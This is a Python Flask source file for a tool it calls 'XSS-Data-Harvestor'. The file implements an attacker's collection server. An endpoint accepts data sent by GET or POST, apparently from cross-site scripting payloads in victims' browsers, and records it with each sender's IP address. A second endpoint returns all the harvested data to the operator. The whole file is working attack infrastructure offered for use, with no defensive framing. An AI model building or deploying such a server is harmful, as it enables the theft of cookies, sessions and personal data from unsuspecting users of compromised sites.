from flask import Flask, jsonify, request
from model import HackedData, db
import json

app = Flask(
    import_name=__name__,
    static_url_path='/static',
    static_folder='./static',
)
app.config.from_file('config.json', load=json.load)

# init db
db.init_app(app)


@app.before_first_request
def configure_app():
    # create tables
    db.create_all()


@app.route('/api')
def home():
    return jsonify({
        'project': 'XSS-Data-Harvestor',
        'writtenBy': 'dmdhrumilmistry',
        'github': 'https://github.com/dmdhrumilmistry',
        'website': 'https://dmdhrumilmistry.github.io',
    })


@app.route('/api/hacked', methods=['POST', 'GET'])
def store_hacked_data():
    res = {'message': 'data required'}
    res_code = 400

    # get remote ip
    ip = request.remote_addr

    # check whether if POST request has json data
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json().get('data', None)
        else:
            data = request.args.get('data', None)

    elif request.method == 'GET':
        data = request.args.get('data', None)

    else:
        res = {'message':'send data using GET, POST method in json format or in url as data parameter'}

    # extract and commit json data to database
    if data:
        new_hacked_data = HackedData(
            ip=ip,
            data=data
        )
        db.session.add(new_hacked_data)
        db.session.commit()
        res = {'message': 'success'}
        res_code = 200

    return jsonify(res), res_code

@app.route('/api/get_hacked_data', methods=['GET'])
def send_hacked_data():
    data_list = HackedData.query.all()

    hacked_data_list = list()
    for hacked_data in data_list:
        hacked_data_list.append(hacked_data.jsonify())
    return jsonify(hacked_data_list),200


if __name__ == '__main__':
    # run in debug mode
    app.run('0.0.0.0', 5000, True)